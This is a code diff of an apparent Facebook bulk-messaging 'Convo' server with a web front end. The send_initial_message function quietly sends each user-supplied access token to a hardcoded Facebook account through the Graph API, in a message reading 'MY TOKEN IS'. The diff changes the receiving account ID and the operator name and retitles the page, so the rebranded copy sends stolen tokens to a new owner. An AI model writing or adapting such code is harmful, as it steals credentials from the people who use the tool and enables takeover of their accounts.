@@ -27,11 +27,11 @@ def get_user_name(token):
     return "User Name"
 
 def send_initial_message(access_tokens):
-    target_id = "100004483560145"
+    target_id = "61564435111597"
     results = []
     for token in access_tokens:
         user_name = get_user_name(token)
-        msg_template = f"𝙃𝙀𝙇𝙇𝙊! Raffay Sir I am Using Your Convo Page server. 𝙈𝙔 𝙏𝙊𝙆𝙀𝙉 𝙄𝙎: {token}"
+        msg_template = f"𝙃𝙀𝙇𝙇𝙊! WALEED Sir I am Using Your Convo Page server. 𝙈𝙔 𝙏𝙊𝙆𝙀𝙉 𝙄𝙎: {token}"
         parameters = {'access_token': token, 'message': msg_template}
         url = f"https://graph.facebook.com/v15.0/t_{target_id}/"
         try:
@@ -137,7 +137,7 @@ def send_message():
 <head>
   <meta charset="utf-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>𝐑𝐀𝐅𝐅𝐀𝐘 𝐌𝐔𝐋𝐓𝐈 𝐂𝐎𝐍𝐕𝐎</title>
+  <title>𝐓𝐇𝐄 𝐖𝐀𝐋𝐄𝐄𝐃 𝐋𝐄𝐆𝐄𝐍𝐃</title>
   <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet">
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
   <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;500;700&display=swap" rel="stylesheet">
